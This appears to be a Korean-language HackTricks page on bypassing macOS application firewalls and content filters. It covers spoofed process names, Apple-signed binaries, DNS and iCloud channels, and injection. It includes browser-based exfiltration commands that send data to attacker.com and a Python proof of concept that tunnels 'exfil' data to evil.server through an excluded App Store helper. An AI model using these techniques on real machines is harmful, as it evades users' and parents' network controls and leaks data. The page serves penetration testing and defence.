# macOS 방화벽 우회

{{#include ../../banners/hacktricks-training.md}}

## 발견된 기술

다음 기술들은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.

### 화이트리스트 이름 악용

- 예를 들어, **`launchd`**와 같은 잘 알려진 macOS 프로세스의 이름으로 악성 코드를 호출하기

### 합성 클릭

- 방화벽이 사용자에게 권한을 요청하면 악성 코드가 **허용 클릭**을 하도록 만들기

### **Apple 서명 이진 파일 사용**

- **`curl`**과 같은 것들, 하지만 **`whois`**와 같은 다른 것들도 포함

### 잘 알려진 애플 도메인

방화벽이 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 애플 도메인에 대한 연결을 허용할 수 있습니다. 그리고 iCloud는 C2로 사용될 수 있습니다.

### 일반적인 우회

방화벽을 우회하기 위해 시도할 수 있는 몇 가지 아이디어

### 허용된 트래픽 확인

허용된 트래픽을 아는 것은 잠재적으로 화이트리스트에 있는 도메인이나 어떤 애플리케이션이 그것에 접근할 수 있는지를 식별하는 데 도움이 됩니다.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

DNS 해석은 **`mdnsreponder`** 서명된 애플리케이션을 통해 이루어지며, 이는 아마도 DNS 서버에 연락할 수 있도록 허용될 것입니다.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 브라우저 앱을 통한 방법

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- 구글 크롬
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- 파이어폭스
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- 사파리
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 프로세스 주입을 통한 우회

서버에 연결할 수 있는 프로세스에 **코드를 주입**할 수 있다면 방화벽 보호를 우회할 수 있습니다:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 최근 macOS 방화벽 우회 취약점 (2023-2025)

### 웹 콘텐츠 필터 (스크린 타임) 우회 – **CVE-2024-44206**
2024년 7월, Apple은 스크린 타임 부모 통제에서 사용되는 시스템 전체 “웹 콘텐츠 필터”를 망가뜨린 치명적인 버그를 Safari/WebKit에서 패치했습니다.
특별히 제작된 URI(예: 이중 URL 인코딩된 “://”)는 스크린 타임 ACL에서 인식되지 않지만 WebKit에서는 수용되므로 요청이 필터링되지 않고 전송됩니다. 따라서 URL을 열 수 있는 모든 프로세스(샌드박스화된 코드 또는 서명되지 않은 코드 포함)는 사용자가 명시적으로 차단한 도메인이나 MDM 프로필에 도달할 수 있습니다.

실용적인 테스트 (패치되지 않은 시스템):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) 규칙 순서 버그 in early macOS 14 “Sonoma”
macOS 14 베타 주기 동안 Apple은 **`pfctl`** 주위의 사용자 공간 래퍼에서 회귀를 도입했습니다.
`quick` 키워드로 추가된 규칙(많은 VPN 킬 스위치에서 사용됨)은 조용히 무시되어, VPN/방화벽 GUI가 *차단됨*을 보고하더라도 트래픽 누수가 발생했습니다. 이 버그는 여러 VPN 공급업체에 의해 확인되었고 RC 2(빌드 23A344)에서 수정되었습니다.

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple 서명 헬퍼 서비스 악용 (구형 – macOS 11.2 이전)
macOS 11.2 이전에 **`ContentFilterExclusionList`**는 **`nsurlsessiond`**와 App Store와 같은 약 50개의 Apple 바이너리가 Network Extension 프레임워크로 구현된 모든 소켓 필터 방화벽(LuLu, Little Snitch 등)을 우회할 수 있도록 허용했습니다. 
악성 소프트웨어는 단순히 제외된 프로세스를 생성하거나 그 안에 코드를 주입하여 이미 허용된 소켓을 통해 자신의 트래픽을 터널링할 수 있었습니다. Apple은 macOS 11.2에서 제외 목록을 완전히 제거했지만, 이 기술은 업그레이드할 수 없는 시스템에서 여전히 유효합니다.

예시 개념 증명 (11.2 이전):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## 현대 macOS를 위한 도구 팁

1. GUI 방화벽이 생성하는 현재 PF 규칙 검사:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 이미 *outgoing-network* 권한을 가진 바이너리 나열 (피기백에 유용):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift에서 자신의 네트워크 확장 콘텐츠 필터를 프로그래밍 방식으로 등록합니다.
패킷을 로컬 소켓으로 전달하는 최소한의 루트리스 PoC는 Patrick Wardle의 **LuLu** 소스 코드에서 사용할 수 있습니다.

## 참고 문헌

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
